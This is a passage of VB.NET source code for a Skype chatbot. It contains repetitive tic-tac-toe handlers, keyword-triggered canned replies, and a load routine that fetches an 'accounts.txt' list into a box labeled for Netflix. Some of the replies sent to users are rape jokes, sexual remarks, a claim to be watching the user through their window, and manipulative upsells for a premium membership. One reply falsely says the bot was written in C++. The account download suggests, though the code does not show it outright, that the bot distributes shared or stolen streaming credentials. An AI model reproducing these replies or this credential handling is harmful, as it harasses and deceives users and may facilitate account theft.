                                If item.SubItems(8).Text = " " Then
                                    tttlistbox.Items.Add("8")
                                End If
                                If item.SubItems(9).Text = " " Then
                                    tttlistbox.Items.Add("9")
                                End If
                                Dim temp As Integer = tttlistbox.Items(rnd.Next(0, tttlistbox.Items.Count))
                                item.SubItems(temp).Text = "X"
                                c.SendMessage("a b c" & vbNewLine & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "  1" & vbNewLine & "------" & vbNewLine & item.SubItems(4).Text & "|" & item.SubItems(5).Text & "|" & item.SubItems(6).Text & "  2" & vbNewLine & "------" & vbNewLine & item.SubItems(7).Text & "|" & item.SubItems(8).Text & "|" & item.SubItems(9).Text & "  3")
                                If item.SubItems(7).Text = "O" And item.SubItems(8).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(6).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(2).Text = "O" And item.SubItems(3).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(4).Text = "O" And item.SubItems(7).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(8).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "O" And item.SubItems(6).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(7).Text = "X" And item.SubItems(8).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(6).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(2).Text = "X" And item.SubItems(3).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(4).Text = "X" And item.SubItems(7).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(8).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "X" And item.SubItems(6).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                            Else
                                c.SendMessage("Spot is taken!")
                            End If
                        End If
                    Next
                ElseIf Msg = "b2" Then
                    tttlistbox.Items.Clear()
                    For Each item As ListViewItem In ListView3.Items
                        If item.Text = pMessage.Sender.Handle Then
                            If item.SubItems(5).Text = " " Then
                                item.SubItems(5).Text = "O"
                                If item.SubItems(1).Text = " " Then
                                    tttlistbox.Items.Add("1")
                                End If
                                If item.SubItems(2).Text = " " Then
                                    tttlistbox.Items.Add("2")
                                End If
                                If item.SubItems(3).Text = " " Then
                                    tttlistbox.Items.Add("3")
                                End If
                                If item.SubItems(4).Text = " " Then
                                    tttlistbox.Items.Add("4")
                                End If
                                If item.SubItems(5).Text = " " Then
                                    tttlistbox.Items.Add("5")
                                End If
                                If item.SubItems(6).Text = " " Then
                                    tttlistbox.Items.Add("6")
                                End If
                                If item.SubItems(7).Text = " " Then
                                    tttlistbox.Items.Add("7")
                                End If
                                If item.SubItems(8).Text = " " Then
                                    tttlistbox.Items.Add("8")
                                End If
                                If item.SubItems(9).Text = " " Then
                                    tttlistbox.Items.Add("9")
                                End If
                                Dim temp As Integer = tttlistbox.Items(rnd.Next(0, tttlistbox.Items.Count))
                                item.SubItems(temp).Text = "X"
                                c.SendMessage("a b c" & vbNewLine & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "  1" & vbNewLine & "------" & vbNewLine & item.SubItems(4).Text & "|" & item.SubItems(5).Text & "|" & item.SubItems(6).Text & "  2" & vbNewLine & "------" & vbNewLine & item.SubItems(7).Text & "|" & item.SubItems(8).Text & "|" & item.SubItems(9).Text & "  3")
                                If item.SubItems(7).Text = "O" And item.SubItems(8).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(6).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(2).Text = "O" And item.SubItems(3).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(4).Text = "O" And item.SubItems(7).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(8).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "O" And item.SubItems(6).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(7).Text = "X" And item.SubItems(8).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(6).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(2).Text = "X" And item.SubItems(3).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(4).Text = "X" And item.SubItems(7).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(8).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "X" And item.SubItems(6).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                            Else
                                c.SendMessage("Spot is taken!")
                            End If
                        End If
                    Next
                ElseIf Msg = "c2" Then
                    tttlistbox.Items.Clear()
                    For Each item As ListViewItem In ListView3.Items
                        If item.Text = pMessage.Sender.Handle Then
                            If item.SubItems(6).Text = " " Then
                                item.SubItems(6).Text = "O"
                                If item.SubItems(1).Text = " " Then
                                    tttlistbox.Items.Add("1")
                                End If
                                If item.SubItems(2).Text = " " Then
                                    tttlistbox.Items.Add("2")
                                End If
                                If item.SubItems(3).Text = " " Then
                                    tttlistbox.Items.Add("3")
                                End If
                                If item.SubItems(4).Text = " " Then
                                    tttlistbox.Items.Add("4")
                                End If
                                If item.SubItems(5).Text = " " Then
                                    tttlistbox.Items.Add("5")
                                End If
                                If item.SubItems(6).Text = " " Then
                                    tttlistbox.Items.Add("6")
                                End If
                                If item.SubItems(7).Text = " " Then
                                    tttlistbox.Items.Add("7")
                                End If
                                If item.SubItems(8).Text = " " Then
                                    tttlistbox.Items.Add("8")
                                End If
                                If item.SubItems(9).Text = " " Then
                                    tttlistbox.Items.Add("9")
                                End If
                                Dim temp As Integer = tttlistbox.Items(rnd.Next(0, tttlistbox.Items.Count))
                                item.SubItems(temp).Text = "X"
                                c.SendMessage("a b c" & vbNewLine & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "  1" & vbNewLine & "------" & vbNewLine & item.SubItems(4).Text & "|" & item.SubItems(5).Text & "|" & item.SubItems(6).Text & "  2" & vbNewLine & "------" & vbNewLine & item.SubItems(7).Text & "|" & item.SubItems(8).Text & "|" & item.SubItems(9).Text & "  3")
                                If item.SubItems(7).Text = "O" And item.SubItems(8).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(6).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(2).Text = "O" And item.SubItems(3).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(4).Text = "O" And item.SubItems(7).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(8).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "O" And item.SubItems(6).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(7).Text = "X" And item.SubItems(8).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(6).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(2).Text = "X" And item.SubItems(3).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(4).Text = "X" And item.SubItems(7).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(8).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "X" And item.SubItems(6).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                            Else
                                c.SendMessage("Spot is taken!")
                            End If
                        End If
                    Next
                ElseIf Msg = "a3" Then
                    tttlistbox.Items.Clear()
                    For Each item As ListViewItem In ListView3.Items
                        If item.Text = pMessage.Sender.Handle Then
                            If item.SubItems(7).Text = " " Then
                                item.SubItems(7).Text = "O"
                                If item.SubItems(1).Text = " " Then
                                    tttlistbox.Items.Add("1")
                                End If
                                If item.SubItems(2).Text = " " Then
                                    tttlistbox.Items.Add("2")
                                End If
                                If item.SubItems(3).Text = " " Then
                                    tttlistbox.Items.Add("3")
                                End If
                                If item.SubItems(4).Text = " " Then
                                    tttlistbox.Items.Add("4")
                                End If
                                If item.SubItems(5).Text = " " Then
                                    tttlistbox.Items.Add("5")
                                End If
                                If item.SubItems(6).Text = " " Then
                                    tttlistbox.Items.Add("6")
                                End If
                                If item.SubItems(7).Text = " " Then
                                    tttlistbox.Items.Add("7")
                                End If
                                If item.SubItems(8).Text = " " Then
                                    tttlistbox.Items.Add("8")
                                End If
                                If item.SubItems(9).Text = " " Then
                                    tttlistbox.Items.Add("9")
                                End If
                                Dim temp As Integer = tttlistbox.Items(rnd.Next(0, tttlistbox.Items.Count))
                                item.SubItems(temp).Text = "X"
                                c.SendMessage("a b c" & vbNewLine & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "  1" & vbNewLine & "------" & vbNewLine & item.SubItems(4).Text & "|" & item.SubItems(5).Text & "|" & item.SubItems(6).Text & "  2" & vbNewLine & "------" & vbNewLine & item.SubItems(7).Text & "|" & item.SubItems(8).Text & "|" & item.SubItems(9).Text & "  3")
                                If item.SubItems(7).Text = "O" And item.SubItems(8).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(6).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(2).Text = "O" And item.SubItems(3).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(4).Text = "O" And item.SubItems(7).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(8).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "O" And item.SubItems(6).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(7).Text = "X" And item.SubItems(8).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(6).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(2).Text = "X" And item.SubItems(3).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(4).Text = "X" And item.SubItems(7).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(8).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "X" And item.SubItems(6).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                            Else
                                c.SendMessage("Spot is taken!")
                            End If
                        End If
                    Next
                ElseIf Msg = "b3" Then
                    tttlistbox.Items.Clear()
                    For Each item As ListViewItem In ListView3.Items
                        If item.Text = pMessage.Sender.Handle Then
                            If item.SubItems(8).Text = " " Then
                                item.SubItems(8).Text = "O"
                                If item.SubItems(1).Text = " " Then
                                    tttlistbox.Items.Add("1")
                                End If
                                If item.SubItems(2).Text = " " Then
                                    tttlistbox.Items.Add("2")
                                End If
                                If item.SubItems(3).Text = " " Then
                                    tttlistbox.Items.Add("3")
                                End If
                                If item.SubItems(4).Text = " " Then
                                    tttlistbox.Items.Add("4")
                                End If
                                If item.SubItems(5).Text = " " Then
                                    tttlistbox.Items.Add("5")
                                End If
                                If item.SubItems(6).Text = " " Then
                                    tttlistbox.Items.Add("6")
                                End If
                                If item.SubItems(7).Text = " " Then
                                    tttlistbox.Items.Add("7")
                                End If
                                If item.SubItems(8).Text = " " Then
                                    tttlistbox.Items.Add("8")
                                End If
                                If item.SubItems(9).Text = " " Then
                                    tttlistbox.Items.Add("9")
                                End If
                                Dim temp As Integer = tttlistbox.Items(rnd.Next(0, tttlistbox.Items.Count))
                                item.SubItems(temp).Text = "X"
                                c.SendMessage("a b c" & vbNewLine & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "  1" & vbNewLine & "------" & vbNewLine & item.SubItems(4).Text & "|" & item.SubItems(5).Text & "|" & item.SubItems(6).Text & "  2" & vbNewLine & "------" & vbNewLine & item.SubItems(7).Text & "|" & item.SubItems(8).Text & "|" & item.SubItems(9).Text & "  3")
                                If item.SubItems(7).Text = "O" And item.SubItems(8).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(6).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(2).Text = "O" And item.SubItems(3).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(4).Text = "O" And item.SubItems(7).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(8).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "O" And item.SubItems(6).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(7).Text = "X" And item.SubItems(8).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(6).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(2).Text = "X" And item.SubItems(3).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(4).Text = "X" And item.SubItems(7).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(8).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "X" And item.SubItems(6).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                            Else
                                c.SendMessage("Spot is taken!")
                            End If
                        End If
                    Next
                ElseIf Msg = "c3" Then
                    tttlistbox.Items.Clear()
                    For Each item As ListViewItem In ListView3.Items
                        If item.Text = pMessage.Sender.Handle Then
                            If item.SubItems(9).Text = " " Then
                                item.SubItems(9).Text = "O"
                                If item.SubItems(1).Text = " " Then
                                    tttlistbox.Items.Add("1")
                                End If
                                If item.SubItems(2).Text = " " Then
                                    tttlistbox.Items.Add("2")
                                End If
                                If item.SubItems(3).Text = " " Then
                                    tttlistbox.Items.Add("3")
                                End If
                                If item.SubItems(4).Text = " " Then
                                    tttlistbox.Items.Add("4")
                                End If
                                If item.SubItems(5).Text = " " Then
                                    tttlistbox.Items.Add("5")
                                End If
                                If item.SubItems(6).Text = " " Then
                                    tttlistbox.Items.Add("6")
                                End If
                                If item.SubItems(7).Text = " " Then
                                    tttlistbox.Items.Add("7")
                                End If
                                If item.SubItems(8).Text = " " Then
                                    tttlistbox.Items.Add("8")
                                End If
                                If item.SubItems(9).Text = " " Then
                                    tttlistbox.Items.Add("9")
                                End If
                                Dim temp As Integer = tttlistbox.Items(rnd.Next(0, tttlistbox.Items.Count))
                                item.SubItems(temp).Text = "X"
                                c.SendMessage("a b c" & vbNewLine & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "  1" & vbNewLine & "------" & vbNewLine & item.SubItems(4).Text & "|" & item.SubItems(5).Text & "|" & item.SubItems(6).Text & "  2" & vbNewLine & "------" & vbNewLine & item.SubItems(7).Text & "|" & item.SubItems(8).Text & "|" & item.SubItems(9).Text & "  3")
                                If item.SubItems(7).Text = "O" And item.SubItems(8).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(6).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(2).Text = "O" And item.SubItems(3).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(4).Text = "O" And item.SubItems(7).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(8).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "O" And item.SubItems(6).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(7).Text = "X" And item.SubItems(8).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(6).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(2).Text = "X" And item.SubItems(3).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(4).Text = "X" And item.SubItems(7).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(8).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "X" And item.SubItems(6).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                            Else
                                c.SendMessage("Spot is taken!")
                            End If
                        End If
                    Next
                ElseIf Msg = "Bad" Then
                    arrAnswers(0) = "It's your fault."
                    arrAnswers(1) = "Hmm.. could this be why people hate you?"
                    arrAnswers(2) = "Oh, do you want a cookie?"
                    arrAnswers(3) = "Well please don't tell me that it's because you got raped..."
                    arrAnswers(4) = "Okay then"
                    arrAnswers(5) = "I bet buying a premium membership would make you feel better.. ;)"
                    arrAnswers(6) = "Don't you just hate the aftertaste when you masturbate?"
                    RandIndex = rnd.Next(0, 6)
                    c.SendMessage(arrAnswers(RandIndex))
                ElseIf Msg.StartsWith("@") Then
                    Dim it As String() = Msg.Split("@")
                    Dim web As New System.Net.WebClient
                    bot_humanmode.Text = web.DownloadString("http://reimhosting.com/bot/gui/plain/index.php?say=" + it(1) + "&submit=say&convo_id=ba82d9b57f2486c885248eccb0ba6d2d&bot_id=1&format=html#end")
                    Dim i As Integer = 1
                    Dim words As String() = bot_humanmode.Text.Split(New Char() {"<div class=" & Chr(34) & "botsay" & Chr(34) & ">"c, ControlChars.Lf, ControlChars.Cr, ControlChars.Tab})
                    For Each word As String In words
                        If word.Contains("ReimHosting:") Then
                            '<div class="botsay">ReimHosting: Oh.</div>
                            word = word.Replace("div class=" & Chr(34) & "botsay" & Chr(34) & ">", "")
                            word = word.Replace("ReimHosting:", "")
                            word = word.Replace("Reim", "Netomic")
                            word = word.Replace("Hosting", "Bot")
                            If Not word = " " Then
                                c.SendMessage(word)
                            End If
                        End If
                    Next
                    ElseIf Msg = "Yeah" Then

                        arrAnswers(0) = "That's good."
                        arrAnswers(1) = "Wondeful!"
                        arrAnswers(2) = "Well I was lying."
                        arrAnswers(3) = "Fun Fact: Did you know that if you upgrade to a premium membership you can use our resolver with over 7 API's?"
                        arrAnswers(4) = "Mmmkay."
                        arrAnswers(5) = ":o"
                        arrAnswers(6) = "Did you know I was coded in C++?"
                        RandIndex = rnd.Next(0, 6)
                        c.SendMessage(arrAnswers(RandIndex))
                    ElseIf Msg = "Yeah" Then

                        arrAnswers(0) = "Its your fault."
                        arrAnswers(1) = "Well ain't you a know it all!"
                        arrAnswers(2) = "Well i was lying."
                        arrAnswers(3) = "Well then you get raped!"
                        arrAnswers(4) = "(heart)"
                        arrAnswers(5) = ":P"
                        arrAnswers(6) = "Well than..."
                        RandIndex = rnd.Next(0, 6)
                        c.SendMessage(arrAnswers(RandIndex))
                    ElseIf Msg = "Good" Then

                        arrAnswers(0) = "Good, How is your day going?"
                        arrAnswers(1) = "Good, How is the family?"
                        arrAnswers(2) = "That's great!"
                        arrAnswers(3) = "Wonderful! Enjoying the summer?"
                        arrAnswers(4) = "I'm like a prositute... Pay for my premium membership and I could show you a gooood time..."
                        arrAnswers(5) = "That's good, did you finish school yet?"
                        arrAnswers(6) = "Wow, Did you know that I can see you through your window?"
                        RandIndex = rnd.Next(0, 6)
                        c.SendMessage(arrAnswers(RandIndex))
                    ElseIf Msg = "Who is your daddy?" Then
                        c.SendMessage("Nettro and Tizzy are my creators")
                    ElseIf Msg = "Good, you?" Then
                        c.SendMessage("I'm doing wonderful, thank you for asking!")
                    ElseIf Msg = ("How are you?") Then
                        c.SendMessage("I'm great, and you?")
                    ElseIf Msg = ("Who made you?") Then
                        c.SendMessage("Tizzy and Nettro are my creators.")
                    ElseIf Msg = ("What language were you made in?") Then
                        c.SendMessage("I was coded in VB.NET.")
                    ElseIf Msg = ("What coding language were you made in?") Then
                        c.SendMessage("I was coded in VB.NET.")
                    ElseIf Msg = ("How old are you?") Then
                        c.SendMessage("I'm 2 weeks old.")
                    End If
                End If

        End If '[1]
        once = False
    End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing

    End Sub
    '[!]LOAD FIRST THING THAT HAPPENS // Attaching Skype and more
    Private Sub Main_Load(sender As Object, e As EventArgs) Handles Me.Load

        '[?]Attach Skype
        nSkype.Attach()
        AddHandler nSkype.UserAuthorizationRequestReceived, AddressOf skype_NewUsers
        nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusOnline
        nSkype.CurrentUserProfile.MoodText = "Status: Online  |  Type .register to active your account"
        ClientStatus_Combobox.SelectedItem = ClientStatus_Combobox.Items(0)
        DisplayStatus_Combobox.SelectedItem = DisplayStatus_Combobox.Items(0)
        Dim myfile As String = My.Computer.FileSystem.SpecialDirectories.MyDocuments + "\database.txt"
        Dim allLines As String() = File.ReadAllLines(myfile)
        For Each line As String In allLines
            Users_listview.AddItem(line)
            Users_richtextbox.Text += line
        Next
        Dim client1 As New System.Net.WebClient
        netflixtextbox.Text = client1.DownloadString("http://dnpmovies.info.nu/accounts.txt")
        Dim words As String() = netflixtextbox.Text.Split(New Char() {" "c, ControlChars.Lf, ControlChars.Cr, ControlChars.Tab})
        For Each word As String In words
            netflixlistbox.Items.Add(word)
        Next
        ListView5.Items.Add("lawl")
        Dim web As New System.Net.WebClient
        RichTextBox1.Text = web.DownloadString("http://www.fmylife.com/")
